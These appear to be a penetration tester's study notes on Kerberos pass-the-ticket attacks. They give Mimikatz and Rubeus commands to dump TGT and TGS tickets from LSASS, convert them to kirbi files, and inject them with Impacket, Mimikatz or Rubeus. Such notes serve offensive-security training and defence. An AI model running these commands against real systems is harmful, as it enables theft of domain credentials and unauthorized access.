public:: true

- A different approach is to exploit Kerberos authentication by abusing [*TGT*](((655a1fb1-47f5-446a-8813-e1a809f05a7b))) and [*TGS*](((655b6438-ee0f-4168-8a40-754613d2b793))). As [mentioned here](((6564d528-7b7b-4d33-b49c-36fe2d615343))), *TGT* and *TGS* for currently logged users are stored for future use. These tickets are also stored in LSASS, and we can use Mimikatz to interact with and retrieve our own tickets as well as the tickets of other local users.
	- #+BEGIN_NOTE
	  Stealing a [**TGS**](((655b6438-aa29-434b-bdf9-75e172e85fd1))) would allow us to access only particular resources associated with those tickets.
	  #+END_NOTE
	- #+BEGIN_NOTE
	  Stealing a [**TGT**](((655a4269-a509-429f-95ea-ce8b6582cf9c))) would allow us to request a TGS for specific resources we want to target within the domain. It can use to forge arbitrary TGS.
	  #+END_NOTE
- Harvest tickets
	- With [[Mimikatz]]
	  id:: 656869d9-c249-4f49-9165-bb1034fa8178
		- id:: 65686a95-2f8d-4c16-ba29-4ec6ce616cb4
		  ```
		  > sekurlsa::tickets /export
		  ```
	- With [[Rubeus]]
	  id:: 656869e0-2bb7-4449-868f-abbb5dda4be4
		- ```powershell
		  Rubeus.exe dump
		  ```
		- Since Rubeus returns base64 encoded tickets you can then save them in the **kirbi** format as follow
		  ```powershell
		  [IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<base64_ticket>"))
		  ```
- Pass tickets to different tools
	- [[Impacket]]
		- ```bash
		  # Set the ticket for impacket use
		  export KRB5CCNAME=<TGT_ccache_file_path>
		  ```
	- [[Mimikatz]]
		- ```
		  > kerberos::ptt <ticket_kirbi_file>
		  ```
	- [[Rubeus]]
		- ```powershell
		  Rubeus.exe ptt /ticket:<ticket_kirbi_file>
		  ```